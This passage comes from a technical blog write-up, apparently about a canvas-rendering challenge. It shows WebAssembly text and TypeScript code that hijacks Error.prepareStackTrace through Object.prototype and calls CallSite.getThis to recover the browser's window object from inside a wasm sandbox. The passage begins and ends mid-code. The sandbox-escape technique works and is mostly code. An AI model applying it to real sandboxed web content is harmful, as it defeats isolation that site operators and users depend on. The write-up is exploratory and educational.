(call $object_set_prototype_of (call $get_number_prototype) (local.get $arr))  
(call $call_with_this_and_arg (local.get $reducer_array) (call $get_array_prototype_reduce) (call $get_array_from))  
(call $object_set_prototype_of (call $get_number_prototype) (global.get $object_prototype))  
  
(global.get $saved_element)  
)

(func $get_prepare_stack_trace_string (result externref)  
(local $arr externref)  
(local.set $arr (call $empty_array))

(call $array_push (local.get $arr) (call $make_single_char_string (i32.const 0x70)))  
(call $array_push (local.get $arr) (call $make_single_char_string (i32.const 0x72)))  
(call $array_push (local.get $arr) (call $make_single_char_string (i32.const 0x65)))  
(call $array_push (local.get $arr) (call $make_single_char_string (i32.const 0x70)))  
;; [...]

(call $array_join (local.get $arr))  
)  
```

phew...   
that was a lot

### Putting it all together

#### Recovering the window object

First we have to register our prepareStackTrace function.

The naive approach is to just do this in the renderPixel function and trigger an error right after.

Eg.

```typescript  
// Throws:  
// TypeError: Object prototype may only be an Object or null  
function triggerError() {  
Object.setPrototypeOf([Object.name](http://Object.name), [Object.name](http://Object.name))  
}

export function renderPixel(x, y) {  
set(Object.prototype, getPrepareStackTraceString(), stackTraceHandler)  
triggerError()  
}

function stackTraceHandler(error: externref, callSites: externref) {  
log(callSites)  
// TODO!  
}  
```

```wat  
(func $trigger_error  
(call $object_set_prototype_of (global.get $object_name) (global.get $object_name))   
)

(func $stack_trace_handler (param externref) (param $callsites externref)  
(call $log (local.get $callsites))  
)

(export "stackTraceHandler" (func $stack_trace_handler))

(func $renderPixel (result i32)  
(call $set   
(global.get $object_prototype)   
(call $get_prepare_stack_trace_string)   
(call $object_funcref (ref.func $stack_trace_handler))  
)  
(call $trigger_error)  
i32.const 11141375)  
(export "renderPixel" (func $renderPixel))  
```

But when I tried this it just didn't work. The stack trace didn't have a reference to window.

![Chromium devtools screenshot, showing that calling getThis on all callsites gives either Null or WebAssembly.Instance](https://blog.badat.dev/blog/captivating-canvas-contraption/callsites_no_window.png)

Looks like we need to cause an error to happen in javascript and not wasm. This is actually very easy: all we need to do is not to define a `renderPixel` method,  
which will cause an exception to be thrown.

This obviously means that we can't setup our prepareStackTrace hack in the `renderPixel` function,  
but wasm does have support for defining a `start` function that gets called when the module is instantiated.

```typescript  
export function start() {  
set(Object.prototype, getPrepareStackTraceString(), stackTraceHandler)  
}  
```

```wat  
(func $main  
(call $set   
(global.get $object_prototype)   
(call $get_prepare_stack_trace_string)   
(call $object_funcref (ref.func $stack_trace_handler))  
)  
)  
(start $main)

;;(func $renderPixel (result i32)  
;; i32.const 11141375)  
;;(export "renderPixel" (func $renderPixel))  
```

![Chromium devtools screenshot, with one callsite that returns window when getthis is called on it](https://blog.badat.dev/blog/captivating-canvas-contraption/callsites_window.png)

While writing this post I found that using the [unreachable](<https://developer.mozilla.org/en-US/docs/WebAssembly/Reference/Control_flow/unreachable>) instruction  
instead of triggering an error with `Array.from` creates a stack trace that has a window somewhere in it.  
I'm really not sure why.

now we can modify the stackTraceHandler function to actually get access to window.

```typescript  
function stackTraceHandler(error: externref, callSites: externref) {  
const callsite = getNthArrayElement(callSites, 0);  
const callsiteProto = Object.getPrototypeOf(callsite);  
const getThis = getPropertyByIndex(callsiteProto, 14);

const window = callWithThis(callsite, getThis);  
log(window)  
}  
```

```wat  
(func $stack_trace_handler (param externref) (param $callsites externref)  
(local $callsite externref)  
(local $callsite_proto externref)  
(local $get_this externref)  
(local $window externref)

```

---

*Truncated at 1200 lines. Full text: <https://blog.badat.dev/blog/captivating-canvas-contraption/>*
